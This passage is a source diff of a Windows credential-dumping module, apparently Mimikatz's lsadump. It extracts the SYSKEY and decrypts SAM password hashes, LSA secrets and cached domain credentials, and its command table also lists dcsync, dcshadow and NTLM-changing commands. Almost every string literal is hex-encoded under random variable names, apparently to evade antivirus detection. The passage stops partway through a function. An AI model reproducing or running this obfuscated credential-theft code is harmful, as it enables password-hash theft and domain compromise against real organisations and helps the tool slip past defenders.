@@ -1,0 +1,3088 @@
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kuhl_m_lsadump.h"
+
+
+const wchar_t  hid_s_a_m__xcuTnx4oslkU[] = {'\x73','\x61','\x6d',0};
+
+const wchar_t  hid_G_e_t__366bm0QEwoKl[] = {'\x47','\x65','\x74','\x20','\x74','\x68','\x65','\x20','\x53','\x79','\x73','\x4b','\x65','\x79','\x20','\x74','\x6f','\x20','\x64','\x65','\x63','\x72','\x79','\x70','\x74','\x20','\x53','\x41','\x4d','\x20','\x65','\x6e','\x74','\x72','\x69','\x65','\x73','\x20','\x28','\x66','\x72','\x6f','\x6d','\x20','\x72','\x65','\x67','\x69','\x73','\x74','\x72','\x79','\x20','\x6f','\x72','\x20','\x68','\x69','\x76','\x65','\x73','\x29',0};
+
+const wchar_t  hid_s_e_c__3idhCMIEdbjE[] = {'\x73','\x65','\x63','\x72','\x65','\x74','\x73',0};
+
+const wchar_t  hid_G_e_t__no1TLU8yNap1[] = {'\x47','\x65','\x74','\x20','\x74','\x68','\x65','\x20','\x53','\x79','\x73','\x4b','\x65','\x79','\x20','\x74','\x6f','\x20','\x64','\x65','\x63','\x72','\x79','\x70','\x74','\x20','\x53','\x45','\x43','\x52','\x45','\x54','\x53','\x20','\x65','\x6e','\x74','\x72','\x69','\x65','\x73','\x20','\x28','\x66','\x72','\x6f','\x6d','\x20','\x72','\x65','\x67','\x69','\x73','\x74','\x72','\x79','\x20','\x6f','\x72','\x20','\x68','\x69','\x76','\x65','\x73','\x29',0};
+
+const wchar_t  hid_c_a_c__L8nysipXYLpv[] = {'\x63','\x61','\x63','\x68','\x65',0};
+
+const wchar_t  hid_G_e_t__nlsOP4X53xMm[] = {'\x47','\x65','\x74','\x20','\x74','\x68','\x65','\x20','\x53','\x79','\x73','\x4b','\x65','\x79','\x20','\x74','\x6f','\x20','\x64','\x65','\x63','\x72','\x79','\x70','\x74','\x20','\x4e','\x4c','\x24','\x4b','\x4d','\x20','\x74','\x68','\x65','\x6e','\x20','\x4d','\x53','\x43','\x61','\x63','\x68','\x65','\x28','\x76','\x32','\x29','\x20','\x28','\x66','\x72','\x6f','\x6d','\x20','\x72','\x65','\x67','\x69','\x73','\x74','\x72','\x79','\x20','\x6f','\x72','\x20','\x68','\x69','\x76','\x65','\x73','\x29',0};
+
+const wchar_t  hid_l_s_a__N1YM6frEjXA0[] = {'\x6c','\x73','\x61',0};
+
+const wchar_t  hid_A_s_k__PkSHMIcKCYDU[] = {'\x41','\x73','\x6b','\x20','\x4c','\x53','\x41','\x20','\x53','\x65','\x72','\x76','\x65','\x72','\x20','\x74','\x6f','\x20','\x72','\x65','\x74','\x72','\x69','\x65','\x76','\x65','\x20','\x53','\x41','\x4d','\x2f','\x41','\x44','\x20','\x65','\x6e','\x74','\x72','\x69','\x65','\x73','\x20','\x28','\x6e','\x6f','\x72','\x6d','\x61','\x6c','\x2c','\x20','\x70','\x61','\x74','\x63','\x68','\x20','\x6f','\x6e','\x20','\x74','\x68','\x65','\x20','\x66','\x6c','\x79','\x20','\x6f','\x72','\x20','\x69','\x6e','\x6a','\x65','\x63','\x74','\x29',0};
+
+const wchar_t  hid_t_r_u__lO55UE1VPZp2[] = {'\x74','\x72','\x75','\x73','\x74',0};
+
+const wchar_t  hid_A_s_k__IdrnaBdA8k5A[] = {'\x41','\x73','\x6b','\x20','\x4c','\x53','\x41','\x20','\x53','\x65','\x72','\x76','\x65','\x72','\x20','\x74','\x6f','\x20','\x72','\x65','\x74','\x72','\x69','\x65','\x76','\x65','\x20','\x54','\x72','\x75','\x73','\x74','\x20','\x41','\x75','\x74','\x68','\x20','\x49','\x6e','\x66','\x6f','\x72','\x6d','\x61','\x74','\x69','\x6f','\x6e','\x20','\x28','\x6e','\x6f','\x72','\x6d','\x61','\x6c','\x20','\x6f','\x72','\x20','\x70','\x61','\x74','\x63','\x68','\x20','\x6f','\x6e','\x20','\x74','\x68','\x65','\x20','\x66','\x6c','\x79','\x29',0};
+
+const wchar_t  hid_b_a_c__n2GtwPbasdOy[] = {'\x62','\x61','\x63','\x6b','\x75','\x70','\x6b','\x65','\x79','\x73',0};
+
+const wchar_t  hid_r_p_d__cFwQujEwARna[] = {'\x72','\x70','\x64','\x61','\x74','\x61',0};
+
+const wchar_t  hid_d_c_s__43a1YClnENWI[] = {'\x64','\x63','\x73','\x79','\x6e','\x63',0};
+
+const wchar_t  hid_A_s_k__r0DHpdvgQsK7[] = {'\x41','\x73','\x6b','\x20','\x61','\x20','\x44','\x43','\x20','\x74','\x6f','\x20','\x73','\x79','\x6e','\x63','\x68','\x72','\x6f','\x6e','\x69','\x7a','\x65','\x20','\x61','\x6e','\x20','\x6f','\x62','\x6a','\x65','\x63','\x74',0};
+
+const wchar_t  hid_d_c_s__ScsRIRq9rToM[] = {'\x64','\x63','\x73','\x68','\x61','\x64','\x6f','\x77',0};
+
+const wchar_t  hid_T_h_e__PLviNEfU2toP[] = {'\x54','\x68','\x65','\x79','\x20','\x74','\x6f','\x6c','\x64','\x20','\x6d','\x65','\x20','\x49','\x20','\x63','\x6f','\x75','\x6c','\x64','\x20','\x62','\x65','\x20','\x61','\x6e','\x79','\x74','\x68','\x69','\x6e','\x67','\x20','\x49','\x20','\x77','\x61','\x6e','\x74','\x65','\x64','\x2c','\x20','\x73','\x6f','\x20','\x49','\x20','\x62','\x65','\x63','\x61','\x6d','\x65','\x20','\x61','\x20','\x64','\x6f','\x6d','\x61','\x69','\x6e','\x20','\x63','\x6f','\x6e','\x74','\x72','\x6f','\x6c','\x6c','\x65','\x72',0};
+
+const wchar_t  hid_s_e_t__khRKCKh8TrAy[] = {'\x73','\x65','\x74','\x6e','\x74','\x6c','\x6d',0};
+
+const wchar_t  hid_A_s_k__7zHdFKn5YkhN[] = {'\x41','\x73','\x6b','\x20','\x61','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x74','\x6f','\x20','\x73','\x65','\x74','\x20','\x61','\x20','\x6e','\x65','\x77','\x20','\x70','\x61','\x73','\x73','\x77','\x6f','\x72','\x64','\x2f','\x6e','\x74','\x6c','\x6d','\x20','\x66','\x6f','\x72','\x20','\x6f','\x6e','\x65','\x20','\x75','\x73','\x65','\x72',0};
+
+const wchar_t  hid_c_h_a__zh1WDXyYD6RN[] = {'\x63','\x68','\x61','\x6e','\x67','\x65','\x6e','\x74','\x6c','\x6d',0};
+
+const wchar_t  hid_A_s_k__DrItu8bvGIO5[] = {'\x41','\x73','\x6b','\x20','\x61','\x20','\x73','\x65','\x72','\x76','\x65','\x72','\x20','\x74','\x6f','\x20','\x73','\x65','\x74','\x20','\x61','\x20','\x6e','\x65','\x77','\x20','\x70','\x61','\x73','\x73','\x77','\x6f','\x72','\x64','\x2f','\x6e','\x74','\x6c','\x6d','\x20','\x66','\x6f','\x72','\x20','\x6f','\x6e','\x65','\x20','\x75','\x73','\x65','\x72',0};
+
+const wchar_t  hid_n_e_t__fhKkA0vKw0YL[] = {'\x6e','\x65','\x74','\x73','\x79','\x6e','\x63',0};
+
+const wchar_t  hid_A_s_k__WJEr7iqibcGw[] = {'\x41','\x73','\x6b','\x20','\x61','\x20','\x44','\x43','\x20','\x74','\x6f','\x20','\x73','\x65','\x6e','\x64','\x20','\x63','\x75','\x72','\x72','\x65','\x6e','\x74','\x20','\x61','\x6e','\x64','\x20','\x70','\x72','\x65','\x76','\x69','\x6f','\x75','\x73','\x20','\x4e','\x54','\x4c','\x4d','\x20','\x68','\x61','\x73','\x68','\x20','\x6f','\x66','\x20','\x44','\x43','\x2f','\x53','\x52','\x56','\x2f','\x57','\x4b','\x53',0};
+
+const wchar_t  hid_p_a_c__OZVAMvYLVD2j[] = {'\x70','\x61','\x63','\x6b','\x61','\x67','\x65','\x73',0};
+
+const wchar_t  hid_m_b_c__d9rhIhpMFD4i[] = {'\x6d','\x62','\x63',0};
+const KUHL_M_C kuhl_m_c_lsadump[] = {
+	{kuhl_m_lsadump_sam,		hid_s_a_m__xcuTnx4oslkU,			hid_G_e_t__366bm0QEwoKl},
+	{kuhl_m_lsadump_secrets,	hid_s_e_c__3idhCMIEdbjE,		hid_G_e_t__no1TLU8yNap1},
+	{kuhl_m_lsadump_cache,		hid_c_a_c__L8nysipXYLpv,		hid_G_e_t__nlsOP4X53xMm},
+	{kuhl_m_lsadump_lsa,		hid_l_s_a__N1YM6frEjXA0,			hid_A_s_k__PkSHMIcKCYDU},
+	{kuhl_m_lsadump_trust,		hid_t_r_u__lO55UE1VPZp2,		hid_A_s_k__IdrnaBdA8k5A},
+	{kuhl_m_lsadump_bkey,		hid_b_a_c__n2GtwPbasdOy,	NULL},
+	{kuhl_m_lsadump_rpdata,		hid_r_p_d__cFwQujEwARna,		NULL},
+	{kuhl_m_lsadump_dcsync,		hid_d_c_s__43a1YClnENWI,		hid_A_s_k__r0DHpdvgQsK7},
+	{kuhl_m_lsadump_dcshadow,	hid_d_c_s__ScsRIRq9rToM,	hid_T_h_e__PLviNEfU2toP},
+	{kuhl_m_lsadump_setntlm,	hid_s_e_t__khRKCKh8TrAy,		hid_A_s_k__7zHdFKn5YkhN},
+	{kuhl_m_lsadump_changentlm,	hid_c_h_a__zh1WDXyYD6RN,	hid_A_s_k__DrItu8bvGIO5},
+	{kuhl_m_lsadump_netsync,	hid_n_e_t__fhKkA0vKw0YL,		hid_A_s_k__WJEr7iqibcGw},
+	{kuhl_m_lsadump_packages,	hid_p_a_c__OZVAMvYLVD2j,	NULL},
+	{kuhl_m_lsadump_mbc,		hid_m_b_c__d9rhIhpMFD4i,			NULL},
+};
+
+const KUHL_M kuhl_m_lsadump = {
+	L"lsadump", L"LsaDump module", NULL,
+	ARRAYSIZE(kuhl_m_c_lsadump), kuhl_m_c_lsadump, NULL, NULL
+};
+
+NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
+{
+	
+	const wchar_t  hid_S_Y_S__7Hb5EsjUYWrK[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
+
+	const wchar_t  hid_S_A_M__asnHFah6FmQS[] = {'\x53','\x41','\x4d',0};
+HANDLE hDataSystem, hDataSam;
+	PKULL_M_REGISTRY_HANDLE hRegistry, hRegistry2;
+	HKEY hBase;
+	BYTE sysKey[SYSKEY_LENGTH];
+	LPCWSTR szSystem = NULL, szSam = NULL;
+
+	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
+	{
+		hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+		if(hDataSystem != INVALID_HANDLE_VALUE)
+		{
+			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hRegistry))
+			{
+				if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, NULL, sysKey))
+				{
+					if(kull_m_string_args_byName(argc, argv, L"sam", &szSam, NULL))
+					{
+						hDataSam = CreateFile(szSam, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+						if(hDataSam != INVALID_HANDLE_VALUE)
+						{
+							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSam, FALSE, &hRegistry2))
+							{
+								kuhl_m_lsadump_getUsersAndSamKey(hRegistry2, NULL, sysKey);
+								kull_m_registry_close(hRegistry2);
+							}
+							CloseHandle(hDataSam);
+						}
+						else PRINT_ERROR_AUTO(L"CreateFile (SAM hive)");
+					}
+				}
+				kull_m_registry_close(hRegistry);
+			}
+			CloseHandle(hDataSystem);
+		}
+		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+	}
+	else
+	{
+		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
+		{
+			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, hid_S_Y_S__7Hb5EsjUYWrK, 0, KEY_READ, &hBase))
+			{
+				if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, hBase, sysKey))
+				{
+					if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, hid_S_A_M__asnHFah6FmQS, 0, KEY_READ, &hBase))
+					{
+						kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hBase, sysKey);
+						kull_m_registry_RegCloseKey(hRegistry, hBase);
+					}
+					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
+				}
+				kull_m_registry_RegCloseKey(hRegistry, hBase);
+			}
+			kull_m_registry_close(hRegistry);
+		}
+	}
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_lsadump_secrets(int argc, wchar_t * argv[])
+{
+	return kuhl_m_lsadump_secretsOrCache(argc, argv, TRUE);
+}
+
+NTSTATUS kuhl_m_lsadump_cache(int argc, wchar_t * argv[])
+{
+	return kuhl_m_lsadump_secretsOrCache(argc, argv, FALSE);
+}
+
+NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsOrCache)
+{
+	
+	 wchar_t  hid_____U__s8I34kesJqtA[] = {'\x3e','\x20','\x55','\x73','\x65','\x72','\x20','\x63','\x61','\x63','\x68','\x65','\x20','\x72','\x65','\x70','\x6c','\x61','\x63','\x65','\x20','\x6d','\x6f','\x64','\x65','\x20','\x21','\n',0};
+
+	 wchar_t  hid________tlJkoFoZePr3[] = {'\x20','\x20','\x2a','\x20','\x75','\x73','\x65','\x72','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x73','\n',0};
+
+	 wchar_t  hid________lGTZaUEALyq4[] = {'\x20','\x20','\x2a','\x20','\x64','\x63','\x63','\x58','\x20','\x20','\x20','\x20','\x20','\x3a','\x20',0};
+
+	const char  hid_passwo_rj7IPOhhyNVR[] = {'\x70','\x61','\x73','\x73','\x77','\x6f','\x72','\x64','\x3a','\x20',0};
+
+	 wchar_t  hid___s____cg6o4mcppRZM[] = {'\x25','\x73','\n',0};
+
+	 wchar_t  hid________Nv8aJ3Y93BkI[] = {'\x20','\x20','\x2a','\x20','\x6e','\x74','\x6c','\x6d','\x20','\x20','\x20','\x20','\x20','\x3a','\x20',0};
+
+	const wchar_t  hid_S_Y_S__uO8jKSaPvL9z[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
+
+	const wchar_t  hid_S_E_C__P1Sis5Bnb0yp[] = {'\x53','\x45','\x43','\x55','\x52','\x49','\x54','\x59',0};
+HANDLE hDataSystem, hDataSecurity;
+	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
+	HKEY hSystemBase, hSecurityBase;
+	BYTE sysKey[SYSKEY_LENGTH];
+	LPCWSTR szSystem = NULL, szSecurity = NULL, szHash, szPassword, szSubject;
+	UNICODE_STRING uPassword;
+	KUHL_LSADUMP_DCC_CACHE_DATA cacheData = {0};
+
+	HCERTSTORE hCertStore = NULL;
+	PCCERT_CONTEXT pCertCtx;
+	BOOL toFree;
+
+	if(!secretsOrCache)
+	{
+		if(kull_m_string_args_byName(argc, argv, L"user", &cacheData.username, NULL))
+		{
+			kprintf(hid_____U__s8I34kesJqtA);
+			kprintf(hid________tlJkoFoZePr3, cacheData.username);
+			
+			if(kull_m_string_args_byName(argc, argv, L"dcc", &szHash, NULL))
+			{
+				if(cacheData.isDCC = kull_m_string_stringToHex(szHash, cacheData.dcc, LM_NTLM_HASH_LENGTH))
+				{
+					kprintf(hid________lGTZaUEALyq4);
+					kull_m_string_wprintf_hex(cacheData.dcc, LM_NTLM_HASH_LENGTH, 0);
+					kprintf(L"\n");
+				}
+				else PRINT_ERROR(L"DCC hash length must be 32 (16 bytes) - will use default password...\n");
+			}
+			else
+			{
+				if(kull_m_string_args_byName(argc, argv, L"ntlm", &szHash, NULL))
+				{
+					cacheData.isNtlm = kull_m_string_stringToHex(szHash, cacheData.ntlm, LM_NTLM_HASH_LENGTH);
+					if(!cacheData.isNtlm)
+						PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes) - will use default password...\n");
+				}
+				if(!cacheData.isNtlm)
+				{
+					kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
+					printf("Toto\n");
+					printf(hid_passwo_rj7IPOhhyNVR);
+					kprintf(hid___s____cg6o4mcppRZM, szPassword);
+					RtlInitUnicodeString(&uPassword, szPassword);
+					cacheData.isNtlm = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
+				}
+				if(cacheData.isNtlm)
+				{
+					kprintf(hid________Nv8aJ3Y93BkI);
+					kull_m_string_wprintf_hex(cacheData.ntlm, LM_NTLM_HASH_LENGTH, 0);
+					kprintf(L"\n");
+				}
+				else cacheData.username = NULL;
+			}
+			kprintf(L"\n");
+		}
+		else if(kull_m_string_args_byName(argc, argv, L"subject", &szSubject, NULL))
+		{
+			if(hCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, CERT_SYSTEM_STORE_CURRENT_USER | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My"))
+			{
+				if(pCertCtx = CertFindCertificateInStore(hCertStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szSubject, NULL))
+				{
+					if(CryptAcquireCertificatePrivateKey(pCertCtx, 0, NULL, &cacheData.hProv, &cacheData.keySpec, &toFree))
+					{
+						if(cacheData.keySpec == CERT_NCRYPT_KEY_SPEC)
+						{
+							PRINT_ERROR(L"CNG not supported yet\n");
+							__try
+							{
+								if(toFree)
+									NCryptFreeObject(cacheData.hProv);
+							}
+							__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
+							{
+								PRINT_ERROR(L"keySpec == CERT_NCRYPT_KEY_SPEC without CNG Handle ?\n");
+							}
+							cacheData.hProv = 0;
+						}
+					}
+					CertFreeCertificateContext(pCertCtx);
+				}
+				else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
+				CertCloseStore(hCertStore, CERT_CLOSE_STORE_FORCE_FLAG);
+			}
+			else PRINT_ERROR_AUTO(L"CertOpenStore");
+		}
+	}
+	
+	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
+	{
+		hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+		if(hDataSystem != INVALID_HANDLE_VALUE)
+		{
+			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hSystem))
+			{
+				if(kuhl_m_lsadump_getComputerAndSyskey(hSystem, NULL, sysKey))
+				{
+					if(kull_m_string_args_byName(argc, argv, L"security", &szSecurity, NULL))
+					{
+						hDataSecurity = CreateFile(szSecurity, GENERIC_READ | (cacheData.username ? GENERIC_WRITE : 0), 0, NULL, OPEN_EXISTING, 0, NULL);
+						if(hDataSecurity != INVALID_HANDLE_VALUE)
+						{
+							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, cacheData.username ? TRUE : FALSE, &hSecurity))
+							{
+								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, secretsOrCache, &cacheData);
+								kull_m_registry_close(hSecurity);
+							}
+							CloseHandle(hDataSecurity);
+						} else PRINT_ERROR_AUTO(L"CreateFile (SECURITY hive)");
+					}
+				}
+				kull_m_registry_close(hSystem);
+			}
+			CloseHandle(hDataSystem);
+		} else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+	}
+	else
+	{
+		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hSystem))
+		{
+			if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, hid_S_Y_S__uO8jKSaPvL9z, 0, KEY_READ, &hSystemBase))
+			{
+				if(kuhl_m_lsadump_getComputerAndSyskey(hSystem, hSystemBase, sysKey))
+				{
+					if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, hid_S_E_C__P1Sis5Bnb0yp, 0, KEY_READ, &hSecurityBase))
+					{
+						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, secretsOrCache, &cacheData);
+						kull_m_registry_RegCloseKey(hSystem, hSecurityBase);
+					}
+					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SECURITY)");
+				}
+				kull_m_registry_RegCloseKey(hSystem, hSystemBase);
+			}
+			kull_m_registry_close(hSystem);
+		}
+	}
+	if(cacheData.hProv && toFree)
+		CryptReleaseContext(cacheData.hProv, 0);
+	return STATUS_SUCCESS;
+}
+
+
+const wchar_t  hid_C_u_r__qrTMrPkKG69c[] = {'\x43','\x75','\x72','\x72','\x65','\x6e','\x74',0};
+
+const wchar_t  hid_D_e_f__jiPs6BcgtHiU[] = {'\x44','\x65','\x66','\x61','\x75','\x6c','\x74',0};
+const wchar_t * kuhl_m_lsadump_CONTROLSET_SOURCES[] = {hid_C_u_r__qrTMrPkKG69c, hid_D_e_f__jiPs6BcgtHiU};
+BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet)
+{
+	
+	const wchar_t  hid_C_o_n__0jPz4VTPQUta[] = {'\x43','\x6f','\x6e','\x74','\x72','\x6f','\x6c','\x53','\x65','\x74','\x30','\x30','\x30',0};
+
+	const wchar_t  hid_S_e_l__dOvNeRrs4GSh[] = {'\x53','\x65','\x6c','\x65','\x63','\x74',0};
+
+	const wchar_t  hid________eOKUMqUaqIT4[] = {'\x25','\x30','\x33','\x75',0};
+BOOL status = FALSE;
+	HKEY hSelect;
+	DWORD i, szNeeded, controlSet;
+
+	wchar_t* currentControlSet = (wchar_t*  )hid_C_o_n__0jPz4VTPQUta;
+
+	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, hid_S_e_l__dOvNeRrs4GSh, 0, KEY_READ, &hSelect))
+	{
+		for(i = 0; !status && (i < ARRAYSIZE(kuhl_m_lsadump_CONTROLSET_SOURCES)); i++)
+		{
+			szNeeded = sizeof(DWORD); 
+			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
+		}
+
+		if(status)
+		{
+			status = FALSE;
+			if(swprintf_s(currentControlSet + 10, 4, hid________eOKUMqUaqIT4, controlSet) != -1)
+				status = kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, currentControlSet, 0, KEY_READ, phCurrentControlSet);
+		}
+		kull_m_registry_RegCloseKey(hRegistry, hSelect);
+	}
+	return status;
+}
+
+
+const wchar_t  hid_S_k_e__zeZaDcEpmq64[] = {'\x53','\x6b','\x65','\x77','\x31',0};
+
+const wchar_t  hid_G_B_G__4WfmG2snBoEA[] = {'\x47','\x42','\x47',0};
+
+const wchar_t  hid_D_a_t__JYchEC6Ym2rI[] = {'\x44','\x61','\x74','\x61',0};
+const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = {L"JD", hid_S_k_e__zeZaDcEpmq64, hid_G_B_G__4WfmG2snBoEA, hid_D_a_t__JYchEC6Ym2rI};
+const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
+BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey)
+{
+	BOOL status = TRUE;
+	DWORD i;
+	HKEY hKey;
+	wchar_t buffer[8 + 1];
+	DWORD szBuffer;
+	BYTE buffKey[SYSKEY_LENGTH];
+
+	for(i = 0 ; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
+	{
+		status = FALSE;
+		if(kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
+		{
+			szBuffer = 8 + 1;
+			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
+				status = swscanf_s(buffer, L"%x", (DWORD *) &buffKey[i*sizeof(DWORD)]) != -1;
+			kull_m_registry_RegCloseKey(hRegistry, hKey);
+		}
+		else PRINT_ERROR(L"LSA Key Class read error\n");
+	}
+	
+	if(status)
+		for(i = 0; i < SYSKEY_LENGTH; i++)
+			sysKey[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];	
+
+	return status;
+}
+
+BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey)
+{
+	
+	 wchar_t  hid_D_o_m__chjytghSfHeh[] = {'\x44','\x6f','\x6d','\x61','\x69','\x6e','\x20','\x3a','\x20',0};
+
+	const wchar_t  hid_C_o_n__W6tlsyNMdmFX[] = {'\x43','\x6f','\x6e','\x74','\x72','\x6f','\x6c','\\','\x43','\x6f','\x6d','\x70','\x75','\x74','\x65','\x72','\x4e','\x61','\x6d','\x65','\\','\x43','\x6f','\x6d','\x70','\x75','\x74','\x65','\x72','\x4e','\x61','\x6d','\x65',0};
+
+	const wchar_t  hid_C_o_m__ZfjUtuCWeTa1[] = {'\x43','\x6f','\x6d','\x70','\x75','\x74','\x65','\x72','\x4e','\x61','\x6d','\x65',0};
+
+	 wchar_t  hid___s____6RJwoLb6xpEL[] = {'\x25','\x73','\n',0};
+
+	 wchar_t  hid_S_y_s__dkt76nSST054[] = {'\x53','\x79','\x73','\x4b','\x65','\x79','\x20','\x3a','\x20',0};
+
+	const wchar_t  hid_C_o_n__CZ3tYmhWJPQs[] = {'\x43','\x6f','\x6e','\x74','\x72','\x6f','\x6c','\\','\x4c','\x53','\x41',0};
+BOOL status = FALSE;
+	PVOID computerName;
+	HKEY hCurrentControlSet, hComputerNameOrLSA;
+
+	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
+	{
+		kprintf(hid_D_o_m__chjytghSfHeh);
+		if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, hid_C_o_n__W6tlsyNMdmFX, hid_C_o_m__ZfjUtuCWeTa1, NULL, &computerName, NULL))
+		{
+			kprintf(hid___s____6RJwoLb6xpEL, computerName);
+			LocalFree(computerName);
+		}
+
+		kprintf(hid_S_y_s__dkt76nSST054);
+		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, hid_C_o_n__CZ3tYmhWJPQs, 0, KEY_READ, &hComputerNameOrLSA))
+		{
+			if(status = kuhl_m_lsadump_getSyskey(hRegistry, hComputerNameOrLSA, sysKey))
+			{
+				kull_m_string_wprintf_hex(sysKey, SYSKEY_LENGTH, 0);
+				kprintf(L"\n");
+			}
+			else PRINT_ERROR(L"kuhl_m_lsadump_getSyskey KO\n");
+			kull_m_registry_RegCloseKey(hRegistry, hComputerNameOrLSA);
+		}
+		else PRINT_ERROR(L"kull_m_registry_RegOpenKeyEx LSA KO\n");
+
+		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
+	}
+	return status;
+}
+
+BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSAMBase, IN LPBYTE sysKey)
+{
+	
+	const wchar_t  hid_S_A_M__l3vLtqjbxNyT[] = {'\x53','\x41','\x4d','\\','\x44','\x6f','\x6d','\x61','\x69','\x6e','\x73','\\','\x41','\x63','\x63','\x6f','\x75','\x6e','\x74',0};
+
+	 wchar_t  hid_L_o_c__baL0AKR2Xory[] = {'\x4c','\x6f','\x63','\x61','\x6c','\x20','\x53','\x49','\x44','\x20','\x3a','\x20',0};
+
+	const wchar_t  hid_S_A_M__nNZDwUFJeQT0[] = {'\x53','\x41','\x4d','\\','\x44','\x6f','\x6d','\x61','\x69','\x6e','\x73','\\','\x41','\x63','\x63','\x6f','\x75','\x6e','\x74',0};
+
+	const wchar_t  hid_U_s_e__ZpO1b1qYNn2B[] = {'\x55','\x73','\x65','\x72','\x73',0};
+
+	const wchar_t  hid_N_a_m__emXAzbU2bjAY[] = {'\x4e','\x61','\x6d','\x65','\x73',0};
+
+	 wchar_t  hid___R_I__YF1qrTz80rqZ[] = {'\n','\x52','\x49','\x44','\x20','\x20','\x3a','\x20','\x25','\x30','\x38','\x78','\x20','\x28','\x25','\x75','\x29','\n',0};
+
+	 wchar_t  hid_U_s_e__6MLHZt7XFx4r[] = {'\x55','\x73','\x65','\x72','\x20','\x3a','\x20','\x25','\x2e','\x2a','\x73','\n',0};
+BOOL status = FALSE;
+	BYTE samKey[SAM_KEY_DATA_KEY_LENGTH];
+	wchar_t * user;
+	HKEY hAccount, hUsers;
+	DWORD i, nbSubKeys, szMaxSubKeyLen, szUser, rid;
+	PUSER_ACCOUNT_V pUAv;
+	LPVOID data;
+
+	if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hSAMBase, hid_S_A_M__l3vLtqjbxNyT, L"V", NULL, &data, &szUser))
+	{
+		kprintf(hid_L_o_c__baL0AKR2Xory);
+		kull_m_string_displaySID((PBYTE) data + szUser - (sizeof(SID) + sizeof(DWORD) * 3));
+		kprintf(L"\n");
+		LocalFree(data);
+	}
+
